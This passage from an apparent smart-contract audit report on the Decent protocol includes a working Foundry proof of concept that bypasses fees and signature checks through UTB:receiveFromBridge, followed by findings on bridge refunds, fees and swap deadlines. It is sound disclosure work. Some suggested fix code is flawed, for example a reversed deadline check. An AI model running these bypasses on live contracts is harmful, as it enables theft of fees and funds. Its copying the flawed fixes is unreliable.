import {IUTBFeeCollector} from "../src/interfaces/IUTBFeeCollector.sol";
import {LzChainSetup} from "lib/forge-toolkit/src/LzChainSetup.sol";
import {console2} from "forge-std/Test.sol";
import {VmSafe} from "forge-std/Vm.sol";

contract UTBReceiveFromBridge is XChainExactOutFixture {

    UTB src_utb;
    UTB dst_utb;
    UniSwapper src_swapper;
    UniSwapper dst_swapper;
    DecentEthRouter src_DecentEthRouter;
    DecentEthRouter dst_DecentEthRouter;
    IDcntEth src_IDcntEth;
    address src_weth; 
    address src_usdc; 
    address dst_weth;
    address dst_usdc;
    uint256 slippage = 1;
    uint256 FEE_AMOUNT = 0.01 ether;
    CalledPOC ap;

    function setUp() public {
        src = arbitrum;
        dst = polygon;
        preSlippage = 2;
        postSlippage = 3;
        initialEthBalance = 1 ether;
        initialUsdcBalance = 10e6;
        MINT_GAS = 9e5;
        setRuntime(ENV_FORGE_TEST);
        loadAllChainInfo();
        setupUsdcInfo();
        setupWethHelperInfo();
        loadAllUniRouterInfo();
        setSkipFile(true);
        vm.label(alice, "alice");
        vm.label(bob, "bob");
        src_weth = getWeth(src);
        src_usdc = getUsdc(src);
        dst_weth = getWeth(dst);
        dst_usdc = getUsdc(dst);
        feeAmount = FEE_AMOUNT;
        _setupXChainUTBInfra();
        _srcChainSetup();
        // start all activities in src chain by default
        switchTo(src);
        ap = new CalledPOC();
    }

    function _setupXChainUTBInfra() internal {
        (src_utb,,src_swapper,src_DecentEthRouter,,) = deployUTBAndItsComponents(src);
        (dst_utb,,dst_swapper,dst_DecentEthRouter,,) = deployUTBAndItsComponents(dst);
        wireUpXChainUTB(src, dst);
    }

    function _srcChainSetup() internal {
        dealTo(src, alice, initialEthBalance);
        mintUsdcTo(src, alice, initialUsdcBalance);
        mintWethTo(src, alice, initialEthBalance);
        cat = deployTheCat(src);
        catUsdcPrice = cat.price();
        catEthPrice = cat.ethPrice();
    }

    function _setupAndGetInstructionsFeesSignature() internal returns(
        SwapAndExecuteInstructions memory,
        FeeStructure memory,
        bytes memory){
        (SwapParams memory swapParams, uint expected) = getSwapParamsExactOut(
            src,
            src_weth,
            src_usdc,
            catUsdcPrice,
            slippage
        );
        address payable refund = payable(alice);
        SwapInstructions memory swapInstructions = SwapInstructions({
            swapperId: src_swapper.getId(),
            swapPayload: abi.encode(swapParams, address(src_utb), refund)
        });
        startImpersonating(alice);
        ERC20(src_weth).approve(address(src_utb), swapParams.amountIn);
        SwapAndExecuteInstructions
            memory instructions = SwapAndExecuteInstructions({
                swapInstructions: swapInstructions,
                target: address(cat),
                paymentOperator: address(cat),
                refund: refund,
                payload: abi.encodeCall(cat.mintWithUsdc, (bob))
            });

        (   bytes memory signature,
            FeeStructure memory fees
        ) = getFeesAndSignature(instructions);
        stopImpersonating();
        return (instructions, fees, signature);
    }

    /*
    Testing correct UTB fee collection/signature validation during normal swap. 
    Adapted from UTBExactOutRoutesTest:testSwapWethToUsdcAndMintAnNft
    */
    function testUTBReceiveFromBridge_SwapWethToUsdcAndMintAnNFTWithFees() public {
        (SwapAndExecuteInstructions memory _instructions,
        FeeStructure memory _fees,
        bytes memory _signature) = _setupAndGetInstructionsFeesSignature();
        startImpersonating(alice);
        uint256 aliceETHBalanceBefore = address(alice).balance;
        src_utb.swapAndExecute{value: feeAmount}(_instructions, _fees, _signature);
        stopImpersonating();
        // confirm alice has spent feeAmount
        assertEq(address(alice).balance, aliceETHBalanceBefore - feeAmount);
        // confirm bob got the NFT
        assertEq(cat.balanceOf(bob), 1);
        assertEq(ERC20(src_usdc).balanceOf(address(cat)), cat.price());
        // checking fees
        address feeCollector = address(feeCollectorLookup[src]);
        if (feeToken == address(0)) {
            // expect src feeCollector balance to be the feeAmount
            assertEq(feeCollector.balance, feeAmount);
        } else {
            assertEq(ERC20(feeToken).balanceOf(feeCollector), feeAmount);
        }
    }

    /*
    Missing access control on UTB:receiveFromBridge allows UTB swaps to be executed while bypassing fee/swap instruction signature verification. 
    */
    function testUTBReceiveFromBridge_BypassFeesAndSignature() public {
        /* getting the SwapAndExecuteInstructions struct for 
        swapping WETH to USDC and minting bob a VeryCoolCat NFT.
        FeeStructure and signature are not necessary this time.
        */
        (SwapAndExecuteInstructions memory _instructions,,) = _setupAndGetInstructionsFeesSignature();
        // checking feeCollector to see if it has receievd any fees
        address feeCollector = address(feeCollectorLookup[src]);
        uint256 aliceETHBalanceBefore = address(alice).balance;
        uint256 feeCollectorETHBalanceBefore = address(feeCollector).balance;
         startImpersonating(alice);
        /* use UTB:receiveFromBridge to directly call UTB:_swapAndExecute,
         bypassing UTB:retrieveAndCollectFees modifier to send tx without fees or signature
         with arbitrary additional payload.*/
        src_utb.receiveFromBridge(
            _instructions.swapInstructions,
            _instructions.target,
            _instructions.paymentOperator,
            _instructions.payload,
            _instructions.refund);
        stopImpersonating();
        // confirm alice has not spent any ETH/fees
        assertEq(address(alice).balance, aliceETHBalanceBefore);
        // confirm bob got the NFT
        assertEq(cat.balanceOf(bob), 1);
        assertEq(ERC20(src_usdc).balanceOf(address(cat)), cat.price());
        if (feeToken == address(0)) {
            // expect src feeCollector ETH balance not to change. In this case, it is 0
            assertEq(feeCollector.balance, feeCollectorETHBalanceBefore); 
            assertEq(feeCollector.balance, 0); 
        } else {
            assertEq(ERC20(feeToken).balanceOf(feeCollector), 0);
        }
    }

    /* Showing arbitrary calldata being executed in SwapAndExecuteInstructions.payload 
    by using UTB:receiveFromBridge to send an unsigned swap for 0 amount with no fees*/
    function testUTBReceiveFromBridge_ArbitraryCalldata() public {
        // arg: SwapInstructions memory postBridge
        (SwapParams memory swapParams, uint expected) = getSwapParamsExactOut(
            src, // string memory chain
            src_weth, // address tokenIn/tokenOut can be the same.
            src_weth, // address tokenOut
            0, // uitn256 amountOut can be zero
            slippage // uint256 slippage
        );
        // arg: address payable refund
        address payable refund = payable(alice); 
        // get SwapInstructions for SwapAndExecuteInstructions
        SwapInstructions memory swapInstructions = SwapInstructions({
            swapperId: src_swapper.getId(),
            swapPayload: abi.encode(swapParams, address(src_utb), refund)
        });
        startImpersonating(alice);
        //get SwapAndExecuteInstructions
        SwapAndExecuteInstructions
        memory _instructions = SwapAndExecuteInstructions({
            swapInstructions: swapInstructions,
            target:address(ap), // will be sending funds to alice on DST
            paymentOperator: address(alice), // address UTBExecutor approves
            refund: payable(address(alice)),
            // make arbitrary call
            payload: abi.encodeCall(ap.called, ())
        });
        // start recording for events
        vm.recordLogs();
        /* use UTB:receiveFromBridge to directly call UTB:_swapAndExecute,
        bypassing UTB:retrieveAndCollectFees modifier to send tx without fees or signature
        with arbitrary additional payload.*/
        src_utb.receiveFromBridge(
            _instructions.swapInstructions,
            _instructions.target,
            _instructions.paymentOperator,
            _instructions.payload,
            _instructions.refund);
        stopImpersonating();
        // capture emitted events
        VmSafe.Log[] memory entries = vm.getRecordedLogs();
        for (uint i = 0; i < entries.length; i++) {
        if (entries[i].topics[0] == keccak256("Called(string)")) {
            // assert that the event data contains the POC contract's string.
            assertEq(abi.decode(entries[i].data, (string)), 
            "POC contract called");
            }   
        }
    }
}

// simple test contract to register an event if called() is called.
contract CalledPOC {

    event Called(string);

    constructor() payable {}
    function called() public payable {
        emit Called("POC contract called");
    }

    receive() external payable {}

    fallback() external payable {}
}

```

</details>

Tests:

*   `testUTBReceiveFromBridge_SwapWethToUsdcAndMintAnNFTWithFee`: A benign test function to ensure normal swaps with fees are working as intended, where Alice executes a signed inter-chain swap between WETH and USDC before minting a VeryCoolCat test NFT to Bob. Adapted from the [`UTBExactOutRoutesTest:testSwapWethToUsdcAndMintAnNft` test](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/test/UTBExactOutRoutesTestEth2Eth.t.sol#L31).
*   `testUTBReceiveFromBridge_BypassFeesAndSignature`: Demonstrating the issue by using the same swap with fee payload used in the `testUTBReceiveFromBridge_SwapWethToUsdcAndMintAnNFTWithFee` test, sent through the `UTB:receiveFromBridge` function.
*   `testUTBReceiveFromBridge_ArbitraryCalldata`: Demonstrating the issue by causing arbitrary unsigned calldata to be executed via the `UTB:receiveFromBridge` function. Note that a swap between the same WETH token, for amount 0, was used as the swap instructions for this test for clarity.

**PoC instructions:**

*   Clone and set up the [`audit repo`](https://github.com/code-423n4/2024-01-decent) repo and `.env` file as noted in [`Tests`](https://github.com/code-423n4/2024-01-decent?tab=readme-ov-file#tests)
*   Add the Forge test suite file, `UTBReceiveFromBridge.t.sol`, to the repo's [`/test` directory.](https://github.com/code-423n4/2024-01-decent/tree/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/test)
*   Run the following command to validate all tests:

```
❯ forge test --match-test testUTBReceiveFromBridge_
[⠒] Compiling...No files changed, compilation skipped
[⠢] Compiling...

Running 3 tests for test/UTBReceiveFromBridge.t.sol:UTBReceiveFromBridge
[PASS] testUTBReceiveFromBridge_ArbitraryCalldata() (gas: 169476)
[PASS] testUTBReceiveFromBridge_BypassFeesAndSignature() (gas: 678548)
[PASS] testUTBReceiveFromBridge_SwapWethToUsdcAndMintAnNFTWithFees() (gas: 703800)
Test result: ok. 3 passed; 0 failed; 0 skipped; finished in 24.86s
 
Ran 1 test suites: 3 tests passed, 0 failed, 0 skipped (3 total tests)

```

### Tools Used

Foundry, VSCode

### Recommended Mitigation Steps

### Primary Recommendation: Implement a robust access control modifier on the `UTB:receiveFromBridge` function to restrict access to known bridge adaptor addresses

The `UTB:receiveFromBridge` function appears to be intended to be called by the [`DecentBridgeAdapter:receiveFromBridge`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/bridge_adapters/DecentBridgeAdapter.sol#L147) and [`StargateBridgeAdapter:sgReceive`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/bridge_adapters/StargateBridgeAdapter.sol#L209) functions. These functions are protected by the [`BaseAdapter:onlyExecutor`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/bridge_adapters/BaseAdapter.sol#L11) modifier. No other calls to \[`UTB:receiveFromBridge`] are made in the audit codebase.

It therefore may be suitable to introduce a similar `onlyBridgeAdapter` modifier to `UTB`, using the already present [`UTB:bridgeAdapters`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTB.sol#L22) mapping to filter calls from only allowlisted bridge adaptors:

```solidity

    //File:src/UTB.sol
    ...

    modifier onlyBridgeAdapter(){
        require(bridgeAdapters[IBridgeAdapter(msg.sender).getId()] != address(0), "invalid bridge adaptor");
        _;
    }

    function receiveFromBridge(
        SwapInstructions memory postBridge,
        address target,
        address paymentOperator,
        bytes memory payload,
        address payable refund
    ) public onlyBridgeAdapter() {
        _swapAndExecute(postBridge, target, paymentOperator, payload, refund);
    }
    ...
```

### Best practices: Review off-chain validator signature generation and update UTBFeeCollector:collectFees to allow for on-chain validation of signatures if [`UTB:feeCollector`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTB.sol#L19) has not been set.

Note that in the `receiveFromBridge` modifier, fee and swap instructions are only validated if a `feeCollector` is set in `UTB`.

**[`UTB:retrieveAndCollectFees`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTB.sol#L228)**

```solidity

//File:src/UTB.col

    modifier retrieveAndCollectFees(
        FeeStructure calldata fees,
        bytes memory packedInfo,
        bytes calldata signature
    ) {
        if (address(feeCollector) != address(0)) { 
            
            // if feeCollector has not been set, then signature verifcation does not occur

            ...

            feeCollector.collectFees{value: value}(fees, packedInfo, signature);
        }
        _;
    }

```

**[`UTBFeeCollector:collectFees`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTBFeeCollector.sol#L44)**

```solidity

//File:src/UTBFeeCollector.sol

    function collectFees(
        FeeStructure calldata fees,
        bytes memory packedInfo,
        bytes memory signature
    ) public payable onlyUtb {
        bytes32 constructedHash = keccak256(
            abi.encodePacked(BANNER, keccak256(packedInfo))
        );
        (bytes32 r, bytes32 s, uint8 v) = splitSignature(signature); // validating both fees and swap instructions with signature from signer
        address recovered = ecrecover(constructedHash, v, r, s);
        require(recovered == signer, "Wrong signature");

        ...
    }
```

It is not known whether this is an intended design choice, possibly stemming from the way any off-chain swap/bridge/fee instruction validator APIs generate signatures and the fact that one signature is expected for both fee content and swap/bridge instructions.

However, if swaps/bridge operations are intended to ever be called without incurring a fee via UTBFeeCollector, it is recommended for off-chain APIs to generate swap/bridge operation signatures with a fee amount of 0 in the case where fees are not intended to be collected for signed swap/bridge operations.

This would allow the [`feecollector.collectFees` line](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTB.sol#L248) in `UTB` to be placed outside of the [`if` check on the `feeCollector` address](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTB.sol#L233).

Alternatively, it is recommended to separate signature verification of fee and swap/bridge instructions in both the API and the UTBFeeCollector contract, to allow their associated signatures to be validated independently.

This would ensure that signed swap/bridge instructions can be verified before execution, in the event that a UTBFeeCollector contract is not set for a particular chain/UTB deployment.

**[0xsomeone (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-01-decent-findings/issues/590#issuecomment-1925312126):**
 > This and its duplicate submissions have illustrated that the `UTB::receiveFromBridge` will behave identically to the `UTB::swapAndExecute` function albeit with no fees applied or signatures validated, permitting users to bypass these measures.
> 
> The maximum impact of this and relevant submissions is the loss of fees that are meant to be imposed when the `UTB::swapAndExecute` functionality is utilized. As a subset of submissions has recognized, the signature validation is also bypassed permitting arbitrary payloads to be executed which is also considered unwanted with an unquantifiable impact.
> 
> Given that the `UTB::swapAndExecute` is one of the main features of the protocol, I consider a medium-risk severity for this exhibit to be more appropriate. 
> 
> This submission has been selected as the best due to going in great detail in relation to the submission, however, it should be noted that the recommended alleviation suffers from impersonation attacks (i.e. results from getter functions on the `msg.sender` can be spoofed) and a `mapping` based whitelist mechanism should be enforced instead.

**[wkantaros (Decent) confirmed](https://github.com/code-423n4/2024-01-decent-findings/issues/590#issuecomment-1942658993)**

***

## [[M-04] Potential loss of capital due to fixed fee calculations](https://github.com/code-423n4/2024-01-decent-findings/issues/520)
*Submitted by [Soliditors](https://github.com/code-423n4/2024-01-decent-findings/issues/520), also found by [Soliditors](https://github.com/code-423n4/2024-01-decent-findings/issues/358), windhustler ([1](https://github.com/code-423n4/2024-01-decent-findings/issues/671), [2](https://github.com/code-423n4/2024-01-decent-findings/issues/657)), [gesha17](https://github.com/code-423n4/2024-01-decent-findings/issues/613), [wangxx2026](https://github.com/code-423n4/2024-01-decent-findings/issues/303), [NentoR](https://github.com/code-423n4/2024-01-decent-findings/issues/162), and [peanuts](https://github.com/code-423n4/2024-01-decent-findings/issues/241)*

The `StargateBridgeAdapter` relies on a fixed fee calculation (0.06% of the current Stargate fee), but as explained in the Stargate documentation, fees can be automatically adjusted to meet demand. ([here](https://stargateprotocol.gitbook.io/stargate/v/user-docs/tokenomics/protocol-fees))

This reward can be adjusted ([StargateFeeLibraryV02.sol#L68](https://github.com/stargate-protocol/stargate/blob/c647a3a647fc693c38b16ef023c54e518b46e206/contracts/libraries/StargateFeeLibraryV02.sol#L68)) to “To incentivize users to conduct swaps that ‘refill’ native asset balances”.
A problem arises because the `StargateBridgeAdapter` doesn't account for this variable fee.

Then the callback function (triggered on the target chain) will receive a token amount greater than `amountIn`. [StargateBridgeAdapter.sol#L207](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/bridge_adapters/StargateBridgeAdapter.sol#L207)

```solidity
IERC20(swapParams.tokenIn).approve(utb, swapParams.amountIn);
```

As you can see, here the difference between the received amount [StargateBridgeAdapter.sol#L188](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/bridge_adapters/StargateBridgeAdapter.sol#L188) and `swapParams.amountIn` gets lost in the adapter.

### Recommended Mitigation Steps

It’s recommended approve the `amountLD` instead of the `swapParams.amountIn` . This way, all token received during the callback will be transfered.

<Details>

```solidity
function sgReceive(
    uint16, // _srcChainid
    bytes memory, // _srcAddress
    uint256, // _nonce
-  	address, // _token
-   uint256, // amountLD
+   address _token,
+   uint256 amountLD,
    bytes memory payload
) external override onlyExecutor {
    (
        SwapInstructions memory postBridge,
        address target,
        address paymentOperator,
        bytes memory utbPayload,
        address payable refund
    ) = abi.decode(
            payload,
            (SwapInstructions, address, address, bytes, address)
        );

    SwapParams memory swapParams = abi.decode(
        postBridge.swapPayload,
        (SwapParams)
    );
- IERC20(swapParams.tokenIn).approve(utb, swapParams.amountIn);
+ IERC20(_token).approve(utb, amountLD); // _token == swapParams.tokenIn

+ swapParams.amountIn = amountLD // swapParams also needs to be updated to swap the correct amount
+ postBridge.swapPayload = abi.encode(swapParams);

    IUTB(utb).receiveFromBridge(
        postBridge,
        target,
        paymentOperator,
        utbPayload,
        refund
    );
}
```

</details>


***

## [[M-05] DecentEthRouter.sol#_bridgeWithPayload() - Any refunded ETH (native token) will be refunded to the DecentBridgeAdapter, making them stuck](https://github.com/code-423n4/2024-01-decent-findings/issues/262)
*Submitted by [deth](https://github.com/code-423n4/2024-01-decent-findings/issues/262), also found by [NPCsCorp](https://github.com/code-423n4/2024-01-decent-findings/issues/715), [MrPotatoMagic](https://github.com/code-423n4/2024-01-decent-findings/issues/594), [Shaheen](https://github.com/code-423n4/2024-01-decent-findings/issues/563), [ZdravkoHr](https://github.com/code-423n4/2024-01-decent-findings/issues/551), [DadeKuma](https://github.com/code-423n4/2024-01-decent-findings/issues/434), [gesha17](https://github.com/code-423n4/2024-01-decent-findings/issues/309), [cu5t0mpeo](https://github.com/code-423n4/2024-01-decent-findings/issues/293), [wangxx2026](https://github.com/code-423n4/2024-01-decent-findings/issues/270), [zaevlad](https://github.com/code-423n4/2024-01-decent-findings/issues/211), [Tendency](https://github.com/code-423n4/2024-01-decent-findings/issues/174), [haxatron](https://github.com/code-423n4/2024-01-decent-findings/issues/129), [bronze\_pickaxe](https://github.com/code-423n4/2024-01-decent-findings/issues/511), [nmirchev8](https://github.com/code-423n4/2024-01-decent-findings/issues/487), [kutugu](https://github.com/code-423n4/2024-01-decent-findings/issues/91), [Timepunk](https://github.com/code-423n4/2024-01-decent-findings/issues/502), and [ptsanev](https://github.com/code-423n4/2024-01-decent-findings/issues/27)*

### Impact

The current flow of swapping and bridging tokens using the `DecentBridgeAdapter` looks like so:

`bridgeAndExecute` inside `UTB` is called, passing in the `bridgeId` of the `DecentBridgeAdapter`.

```jsx
function bridgeAndExecute(
        BridgeInstructions calldata instructions,
        FeeStructure calldata fees,
        bytes calldata signature
    )
        public
        payable
        retrieveAndCollectFees(fees, abi.encode(instructions, fees), signature)
        returns (bytes memory)
    {
        (
            uint256 amt2Bridge,
            BridgeInstructions memory updatedInstructions
        ) = swapAndModifyPostBridge(instructions);
        return callBridge(amt2Bridge, fees.bridgeFee, updatedInstructions);
    }
```

This then makes a call to `callBridge`, which will call `bridge` on the `DecentBridgeAdapter`.

```jsx
function callBridge(
        uint256 amt2Bridge,
        uint bridgeFee,
        BridgeInstructions memory instructions
    ) private returns (bytes memory) {
        bool native = approveAndCheckIfNative(instructions, amt2Bridge);
        return
            IBridgeAdapter(bridgeAdapters[instructions.bridgeId]).bridge{
                value: bridgeFee + (native ? amt2Bridge : 0)
            }(
                amt2Bridge,
                instructions.postBridge,
                instructions.dstChainId,
                instructions.target,
                instructions.paymentOperator,
                instructions.payload,
                instructions.additionalArgs,
                instructions.refund
            );
    }
```

`DecentBridgeAdapter` then makes a call to the `bridgeWithPayload` inside `DecentEthRouter`.

```jsx
function bridge(
        uint256 amt2Bridge,
        SwapInstructions memory postBridge,
        uint256 dstChainId,
        address target,
        address paymentOperator,
        bytes memory payload,
        bytes calldata additionalArgs,
        address payable refund
    ) public payable onlyUtb returns (bytes memory bridgePayload) {
        require(
            destinationBridgeAdapter[dstChainId] != address(0),
            string.concat("dst chain address not set ")
        );

        uint64 dstGas = abi.decode(additionalArgs, (uint64));

        bridgePayload = abi.encodeCall(
            this.receiveFromBridge,
            (postBridge, target, paymentOperator, payload, refund)
        );

        SwapParams memory swapParams = abi.decode(
            postBridge.swapPayload,
            (SwapParams)
        );

        if (!gasIsEth) {
            IERC20(bridgeToken).transferFrom(
                msg.sender,
                address(this),
                amt2Bridge
            );
            IERC20(bridgeToken).approve(address(router), amt2Bridge);
        }

       
        router.bridgeWithPayload{value: msg.value}(
            lzIdLookup[dstChainId],
            destinationBridgeAdapter[dstChainId],
            swapParams.amountIn,
            false,
            dstGas,
            bridgePayload
        );
    }
```

`bridgeWithPayoad` calls the internal function `_bridgeWithPayload` which starts the call to LZ and the bridging process itself.

```jsx
function _bridgeWithPayload(
        uint8 msgType,
        uint16 _dstChainId,
        address _toAddress,
        uint _amount,
        uint64 _dstGasForCall,
        bytes memory additionalPayload,
        bool deliverEth
    ) internal {
        (
            bytes32 destinationBridge,
            bytes memory adapterParams,
            bytes memory payload
        ) = _getCallParams(
                msgType,
                _toAddress,
                _dstChainId,
                _dstGasForCall,
                deliverEth,
                additionalPayload
            );

        ICommonOFT.LzCallParams memory callParams = ICommonOFT.LzCallParams({
            refundAddress: payable(msg.sender), //@audit-issue all refunded tokens will be sent to the DecentBridgeAdapter
            zroPaymentAddress: address(0x0),
            adapterParams: adapterParams
        });

        uint gasValue;
        if (gasCurrencyIsEth) {
            weth.deposit{value: _amount}();
            gasValue = msg.value - _amount;
        } else {
            weth.transferFrom(msg.sender, address(this), _amount);
            gasValue = msg.value;
        }

        dcntEth.sendAndCall{value: gasValue}(
            address(this), // from address that has dcntEth (so DecentRouter)
            _dstChainId,
            destinationBridge, // toAddress
            _amount, // amount
            payload, //payload (will have recipients address)
            _dstGasForCall, // dstGasForCall
            callParams // refundAddress, zroPaymentAddress, adapterParams
        );
    }
```

When we are using LZ, we have to specify `LzCallParams`. The struct holds several things, but importantly it holds the `refundAddress`

```jsx
ICommonOFT.LzCallParams memory callParams = ICommonOFT.LzCallParams({
            refundAddress: payable(msg.sender),
            zroPaymentAddress: address(0x0),
            adapterParams: adapterParams
        });
```

You'll notice that the `refundAddress` is specified as `msg.sender`, in this case `msg.sender` is the `DecentBridgeAdapter` since that's the address that made the call to `DecentEthRouter`.

The `refundAddress` is used for refunding any excess native tokens (in our case) that are sent to LZ in order to pay for the gas. The excess will be refunded on the source chain.

Basically if you send 0.5 ETH to LZ for gas and LZ only needs 0.1ETH, then 0.4ETH will be sent to the `refundAddress`.

The problem here is, that the `DecentBridgeAdapter` has [no way](github.com/code-423n4/2024-01-decent/blob/main/src/bridge_adapters/DecentBridgeAdapter.sol) of retrieving the funds, as it doesn't implement any withdraw functionality whatsoever.

The protocol team even stated in the README.

> Fund Accumulation: Other than the UTBFeeCollector, and DcntEth, the contracts are not intended to hold on to any funds or unnecessary approvals. Any native value or erc20 flowing through the protocol should either get delivered or refunded.

This bug clearly violates what the protocol team expects.

### Proof of Concept

Example:

1.  Alice wants to swap and bridge some tokens from Ethereum to Arbitrum.
2.  For simplicity we'll assume that LZ will need 0.1 ETH in order to pay for gas fees.
3.  Alice sends 0.5ETH instead.
4.  The flow of functions is executed and the extra 0.4 ETH is refunded from LZ to `refundAddress`, which is set to `msg.sender`, which is `DecentBridgeAdapter`.
5.  Alice loses here 0.4 ETH forever, as there is no way to withdraw and send the ETH from the `DecentBridgeAdapter` to Alice.

### Recommended Mitigation Steps

The user specifies a `refund` when calling `bridgeAndExecute` inside `UTB`. Use the address that the user specifies instead of `msg.sender`.

**[wkantaros (Decent) confirmed](https://github.com/code-423n4/2024-01-decent-findings/issues/262#issuecomment-1917918796)**

**[0xsomeone (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-01-decent-findings/issues/262#issuecomment-1923598011):**
 > The Warden has clearly demonstrated that the refund configuration of the LayerZero relayed call payload is incorrect, causing native fund gas refunds to be sent to the wrong address. I appreciate that the Warden has referenced all code snippets necessary for the elaborate cross-chain call.
> 
> In reality, the flaw will result in relatively small amounts of the native asset to be lost. As a result, I believe a medium-risk category is better suited for this vulnerability.

**[ihtishamsudo (Warden) commented](https://github.com/code-423n4/2024-01-decent-findings/issues/262#issuecomment-1929362398):**
 > Thank you, Alex, for judging. I strongly believe that this is a high-severity issue. Although the individual loss per user may be minimal at present, it has the potential to accumulate over time, becoming a persistent problem and frozen funds forever. The existing refund mechanisms contribute to a lack of concern among users when sending gas. Consequently, when substantial gas amounts are sent, significant funds are at risk due to this vulnerability. I kindly request you to revisit and reconsider assigning a high severity rating to this issue. Appreciate your attention to this matter. Thank you again!

**[0xsomeone (Judge) commented](https://github.com/code-423n4/2024-01-decent-findings/issues/262#issuecomment-1930436987):**
 > Hey @ihtisham-sudo, thank you for contributing to this discussion! There has been a long-standing discussion about capping gas-impacting findings at a QA (L) level among the C4 judge community but I have made an exception for this finding.
> 
> In this particular case, I consider it a medium-risk issue as it is likely those transactions would have a substantial over-allocation of gas due to their cross-chain nature. In any other circumstance, this would be considered a QA issue. 

***

# Low Risk and Non-Critical Issues

For this audit, 15 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2024-01-decent-findings/issues/83) by **Kaysoft** received the top score from the judge.

*The following wardens also submitted reports: [Shaheen](https://github.com/code-423n4/2024-01-decent-findings/issues/616), [DadeKuma](https://github.com/code-423n4/2024-01-decent-findings/issues/512), [bronze\_pickaxe](https://github.com/code-423n4/2024-01-decent-findings/issues/508), [nobody2018](https://github.com/code-423n4/2024-01-decent-findings/issues/276), [Aamir](https://github.com/code-423n4/2024-01-decent-findings/issues/712), [SBSecurity](https://github.com/code-423n4/2024-01-decent-findings/issues/621), [Pechenite](https://github.com/code-423n4/2024-01-decent-findings/issues/604), [slvDev](https://github.com/code-423n4/2024-01-decent-findings/issues/542), [rouhsamad](https://github.com/code-423n4/2024-01-decent-findings/issues/505), [0xmystery](https://github.com/code-423n4/2024-01-decent-findings/issues/432), [rjs](https://github.com/code-423n4/2024-01-decent-findings/issues/372), [IceBear](https://github.com/code-423n4/2024-01-decent-findings/issues/261), [ether\_sky](https://github.com/code-423n4/2024-01-decent-findings/issues/199), and [zxriptor](https://github.com/code-423n4/2024-01-decent-findings/issues/89).*

## [L-01] Prevent gas griefing attacks that's possible with custom `address.call`

There are 3 instances of this:
- https://github.com/code-423n4/2024-01-decent/blob/07ef78215e3d246d47a410651906287c6acec3ef/src/UTBExecutor.sol#L52
- https://github.com/code-423n4/2024-01-decent/blob/07ef78215e3d246d47a410651906287c6acec3ef/src/UTBExecutor.sol#L65
- https://github.com/code-423n4/2024-01-decent/blob/07ef78215e3d246d47a410651906287c6acec3ef/src/UTBExecutor.sol#L70

Whenever the returned `bytes data` is not required, using the `.call()` function with non TRUSTED addresses opens the transaction to unnecessary gas griefing by return huge `bytes data`.

Note that this:
```
(success, ) = target.call{value: amount}(payload);
```
Is the same thing as this:
```
(success, bytes data ) = target.call{value: amount}(payload);
```
So in both cases, the `bytes data` is returned and copied to memory. Malicious `target address` can return huge `bytes data` to cause gas grief to the sender. 

### Impact: 

Malicious `target address` can gas grief the sender making the sender waste more gas than necessary.

### Recommendation:

Short term: When returned data is not required, use a low level call:
```
bool status;
assembly {
    status := call(gas(), receiver, amount, 0, 0, 0, 0)
}
require(status, "call failed");
```
Long Term: Consider using https://github.com/nomad-xyz/ExcessivelySafeCall

## [L-02] No `deadline` and address zero check for signatures

There is one instance of this
- https://github.com/code-423n4/2024-01-decent/blob/07ef78215e3d246d47a410651906287c6acec3ef/src/UTBFeeCollector.sol#L44C5-L63C1

The `collectFees(...)` function of the UTBFeeCollector.sol contract verifies signature without a `deadline`.

Secondly there is no check to ensure the `recovered` address is not zero address. This is because ecrecover can return address zero for invalid signature.

Lastly there is no use of nonce for the signatures:
```
function collectFees(
        FeeStructure calldata fees,
        bytes memory packedInfo,
        bytes memory signature
    ) public payable onlyUtb {
        bytes32 constructedHash = keccak256(
            abi.encodePacked(BANNER, keccak256(packedInfo))
        );
        (bytes32 r, bytes32 s, uint8 v) = splitSignature(signature);
        address recovered = ecrecover(constructedHash, v, r, s);
        require(recovered == signer, "Wrong signature");
        if (fees.feeToken != address(0)) {
            IERC20(fees.feeToken).transferFrom(
                utb,
                address(this),
                fees.feeAmount
            );
        }
    }
```

### Impact: 

- Invalid signature can be used before the `signer` state variable is set since it will initially be zero. 
- Signature have no deadline and can be executed anytime

### Recommendation:

Implement `deadline` to signatures and also add address zero check on the recovered address. 
```
require(blocktimestamp >= deadline, "signature expired");
require(recovered != address(0), "signature expired");
```
See EIP712: https://eips.ethereum.org/EIPS/eip-712

## [L-03] Lack of `deadline` protection for swap
There are 2 instances of these
- https://github.com/code-423n4/2024-01-decent/blob/07ef78215e3d246d47a410651906287c6acec3ef/src/swappers/UniSwapper.sol#L153
- https://github.com/code-423n4/2024-01-decent/blob/07ef78215e3d246d47a410651906287c6acec3ef/src/swappers/UniSwapper.sol#L130C13-L134C55

The `swapExactIn` and `swapExactOut` functions did not add `deadline` protection on swap. 
This can allow a miner delay your transaction from being mined until the swap transaction incurs maximum slippage that would allow the miner profit from the swap transaction through sandwich attack.

According to the Uniswap docs: 

>deadline: the unix time after which a swap will fail, to protect against long->pending transactions and wild swings in prices

During high price swings, a miner can delay the transaction as possible until it incurs maximum slippage since there is no unix timestamp supplied at which the swap transaction must revert.
```
